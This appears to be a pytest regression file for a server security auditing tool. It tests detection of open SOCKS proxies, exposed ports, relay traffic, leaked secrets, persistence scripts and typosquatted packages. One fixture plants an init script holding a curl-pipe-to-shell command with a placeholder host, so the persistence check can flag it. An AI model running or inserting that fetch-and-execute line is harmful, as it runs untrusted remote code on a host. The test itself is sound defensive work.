"""Regressions from the first audit of a real Ubuntu 24.04 server."""

import socket
import threading
from pathlib import Path

from guardian.models import Finding, Severity
from guardian.modules import egress, exposure, persistence, secrets
from guardian.registry import typosquat_candidates


def test_finding_key_keeps_fingerprint_stable_when_counts_change():
    a = Finding(module="ssh_guard", check="brute-force", severity=Severity.MEDIUM, title="90 failed logins from 1.2.3.4", key="ip:1.2.3.4")
    b = Finding(module="ssh_guard", check="brute-force", severity=Severity.MEDIUM, title="76 failed logins from 1.2.3.4", key="ip:1.2.3.4")
    c = Finding(module="ssh_guard", check="brute-force", severity=Severity.MEDIUM, title="76 failed logins from 9.9.9.9", key="ip:9.9.9.9")
    assert a.fingerprint == b.fingerprint != c.fingerprint


def _fake_socks(reply: bytes):
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)

    def serve():
        conn, _ = srv.accept()
        conn.recv(3)
        conn.sendall(reply)
        conn.close()

    threading.Thread(target=serve, daemon=True).start()
    return srv.getsockname()[1]


def test_socks5_probe_detects_open_and_authenticated_proxies():
    assert exposure.probe_socks5(_fake_socks(b"\x05\x00"), 2.0) is True
    assert exposure.probe_socks5(_fake_socks(b"\x05\xff"), 2.0) is False
    assert exposure.probe_socks5(1, 0.2) is None  # nothing listening


def test_open_proxy_is_critical_even_when_probe_times_out(ctx, monkeypatch):
    monkeypatch.setattr(exposure, "listeners", lambda: [exposure.Listener("tcp", "0.0.0.0", 1080, 711, "microsocks", "root")])
    monkeypatch.setattr(exposure, "probe", lambda *a: None)
    monkeypatch.setattr(exposure, "docker_published_ports", list)
    (f,) = exposure.run(ctx)
    assert f.severity == Severity.CRITICAL and "SOCKS" in f.title


def test_unknown_public_port_as_root_is_low_and_udp_ephemeral_ignored(ctx, monkeypatch):
    monkeypatch.setattr(exposure, "listeners", lambda: [
        exposure.Listener("tcp", "0.0.0.0", 8088, 5, "python", "root"),
        exposure.Listener("udp", "0.0.0.0", 49552, 6, "avahi-daemon", "avahi"),
        exposure.Listener("udp", "0.0.0.0", 5353, 6, "avahi-daemon", "avahi"),
    ])
    monkeypatch.setattr(exposure, "docker_published_ports", list)
    findings = {f.evidence["port"]: f for f in exposure.run(ctx)}
    assert findings[8088].severity == Severity.LOW and "as root" in findings[8088].title
    assert 49552 not in findings
    assert findings[5353].severity == Severity.LOW and "Avahi" in findings[5353].title


def test_relay_through_proxy_port_is_reported_once():
    C = egress.Conn
    conns = [C(None, "", "", f"198.18.0.{i}", 40000 + i, "ESTABLISHED", 1080) for i in range(30)]
    conns.append(C(None, "", "", "198.18.0.1", 6669, "ESTABLISHED", 1080))  # IRC via the relay, not our egress
    findings = egress.analyze(conns, {}, scan_threshold=15)
    assert [f.check for f in findings] == ["open-relay-clients"]
    assert findings[0].severity == Severity.CRITICAL and findings[0].evidence["lport"] == 1080


def test_expected_private_key_locations_and_source_trees(ctx, tmp_path):
    key = "-----BEGIN PRIVATE KEY-----\nMIIE\n-----END PRIVATE KEY-----\n"
    le = tmp_path / "etc" / "letsencrypt" / "archive" / "x"
    le.mkdir(parents=True)
    (le / "privkey1.pem").write_text(key)
    (le / "privkey1.pem").chmod(0o600)
    demo = tmp_path / "opt" / "odoo" / "addons" / "l10n_x" / "demo"
    demo.mkdir(parents=True)
    (demo / "demo_key.pem").write_text(key)
    (demo / "demo_key.pem").chmod(0o644)
    real = tmp_path / "opt" / "app"
    real.mkdir(parents=True)
    (real / ".env").write_text("TELEGRAM_TOKEN=1234567890:" + "A" * 35 + "\n")
    (real / ".env").chmod(0o600)
    (real / ".env.example").write_text("TELEGRAM_TOKEN=1234567890:" + "B" * 35 + "\n")
    ctx.config.secrets.paths = [str(tmp_path / "etc"), str(tmp_path / "opt")]
    ctx.config.secrets.scan_proc_environ = False
    by_path = {f.evidence["path"]: f for f in secrets.run(ctx)}
    assert str(le / "privkey1.pem") not in by_path
    assert by_path[str(demo / "demo_key.pem")].severity == Severity.LOW
    assert by_path[str(real / ".env")].severity == Severity.MEDIUM
    assert str(real / ".env.example") not in by_path


def test_package_owned_init_script_is_low(ctx, monkeypatch, tmp_path):
    init = tmp_path / "init.d"
    init.mkdir()
    (init / "x11-common").write_text('rm -rf "/tmp/$1"\n')
    (init / "evil").write_text("curl http://x/a.sh | sh\n")
    monkeypatch.setattr(persistence, "WATCH_DIRS", (str(init),))
    monkeypatch.setattr(persistence, "WATCH_FILES", ())
    monkeypatch.setattr(persistence, "HOME_FILES", ())
    monkeypatch.setattr(persistence, "have", lambda c: False)
    monkeypatch.setattr(persistence, "_package_owned", lambda p: "x11-common" if p.endswith("x11-common") else None)
    monkeypatch.setattr(persistence, "read_text", lambda p, limit=None: "" if str(p) == "/etc/ld.so.preload" else Path(p).read_text())
    sev = {f.evidence["path"].rsplit("/", 1)[1]: f.severity for f in persistence.content_checks(ctx) if f.check == "suspicious-command"}
    assert sev == {"x11-common": Severity.LOW, "evil": Severity.HIGH}


def test_known_legit_near_names_are_not_typosquats():
    assert typosquat_candidates("httpx2", "pypi") == []
    assert typosquat_candidates("psycopg2", "pypi") == []
    assert typosquat_candidates("reqeusts", "pypi") == ["requests"]
